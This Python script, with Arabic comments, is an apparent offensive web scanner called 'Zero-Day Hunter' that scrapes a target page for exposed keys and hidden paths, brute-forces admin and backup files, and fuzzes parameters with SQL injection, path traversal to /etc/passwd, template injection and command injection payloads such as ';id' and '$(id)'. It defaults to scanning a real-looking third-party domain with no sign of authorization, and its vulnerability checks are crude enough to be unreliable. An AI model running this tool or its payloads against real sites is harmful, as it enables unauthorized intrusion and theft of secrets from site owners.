#!/usr/bin/env python3
"""
🔍 Zero-Day Hunter v1 - يكتشف ثغرات جديدة
يحلل الكود + Fuzzing ذكي
"""
import requests, sys, json, os, re, random, string, time
from datetime import datetime
from urllib.parse import urlparse

class ZeroDayHunter:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.findings = []
        self.session = requests.Session()
    
    def log(self, msg): print(f"[🔍] {msg}")
    
    def analyze_source(self):
        """تحليل الكود المصدري للبحث عن أنماط"""
        self.log("📄 تحليل الكود المصدري...")
        
        try:
            r = self.session.get(self.target, timeout=10)
            html = r.text
            
            # البحث عن تعليقات
            comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
            if comments:
                self.log(f"   📝 {len(comments)} تعليقات")
                for c in comments[:3]:
                    if len(c.strip()) > 10:
                        self.log(f"      {c.strip()[:80]}")
            
            # البحث عن مفاتيح
            keys = re.findall(r'(?:key|token|secret|password|api_key)\s*[:=]\s*["\']([^"\']{4,})["\']', html, re.IGNORECASE)
            if keys:
                self.log(f"   🔑 {len(keys)} مفاتيح محتملة")
                for k in keys[:5]:
                    self.log(f"      {k}")
            
            # البحث عن إصدارات
            versions = re.findall(r'(?:version|v)\s*[:=]?\s*["\']?([0-9]+\.[0-9]+\.[0-9]+)', html, re.IGNORECASE)
            if versions:
                self.log(f"   📌 {len(versions)} إصدارات")
                for v in versions[:5]:
                    self.log(f"      {v}")
            
            # البحث عن مسارات مخفية
            paths = re.findall(r'["\'](/[^"\']{2,30})["\']', html)
            hidden = [p for p in paths if not p.startswith(('/css','/js','/images','/fonts'))]
            if hidden:
                self.log(f"   🔗 {len(hidden)} مسارات محتملة")
                for p in hidden[:5]:
                    self.log(f"      {p}")
            
        except Exception as e:
            self.log(f"   ❌ {e}")
    
    def fuzz_endpoints(self):
        """Fuzzing نقاط النهاية"""
        self.log("💣 Fuzzing...")
        
        # توليد مسارات عشوائية
        words = ["api","admin","login","register","user","test","dev","backup","config","debug","temp","old","new","v1","v2"]
        
        for word in words:
            for suffix in ["", ".php", ".html", ".json", ".xml", ".bak", ".old"]:
                path = f"/{word}{suffix}"
                try:
                    r = self.session.get(f"{self.target}{path}", timeout=3)
                    if r.status_code != 404:
                        self.findings.append({"type":"path","path":path,"status":r.status_code,"size":len(r.text)})
                        self.log(f"   🚨 {path} → {r.status_code} ({len(r.text)} bytes)")
                except:
                    pass
                time.sleep(0.1)
    
    def fuzz_parameters(self):
        """Fuzzing البارامترات"""
        self.log("🎯 Fuzzing Parameters...")
        
        params = ["id","page","file","url","redirect","q","search","query","debug","test","show","display"]
        values = ["1","'","1' OR '1'='1","../../../etc/passwd","{{7*7}}",";id","|whoami","$(id)","`id`"]
        
        for param in params:
            for value in values[:3]:
                try:
                    r = self.session.get(f"{self.target}?{param}={value}", timeout=3)
                    text = r.text.lower()
                    
                    # كشف ثغرات
                    if "error" in text or "sql" in text or "mysql" in text:
                        self.findings.append({"type":"sqli","param":param,"value":value})
                        self.log(f"   🚨 SQLi: ?{param}={value}")
                        break
                    if "root:" in text and "html" not in text:
                        self.findings.append({"type":"lfi","param":param,"value":value})
                        self.log(f"   🚨 LFI: ?{param}={value}")
                        break
                    if "49" in text and value == "{{7*7}}":
                        self.findings.append({"type":"ssti","param":param,"value":value})
                        self.log(f"   🚨 SSTI: ?{param}={value}")
                        break
                except:
                    pass
                time.sleep(0.1)
    
    def run(self):
        self.log(f"🔍 Zero-Day Hunter: {self.target}")
        self.log("═" * 60)
        
        self.analyze_source()
        self.fuzz_endpoints()
        self.fuzz_parameters()
        
        self.log(f"\n📊 {len(self.findings)} اكتشاف")
        for f in self.findings:
            self.log(f"   🚨 {f['type']}: {f.get('path',f.get('param','?'))}")
        
        # حفظ
        os.makedirs("logs/zeroday", exist_ok=True)
        fname = f"logs/zeroday/{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump(self.findings, f, indent=2)
        self.log(f"📁 {fname}")
        
        return self.findings

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ZeroDayHunter(target).run()
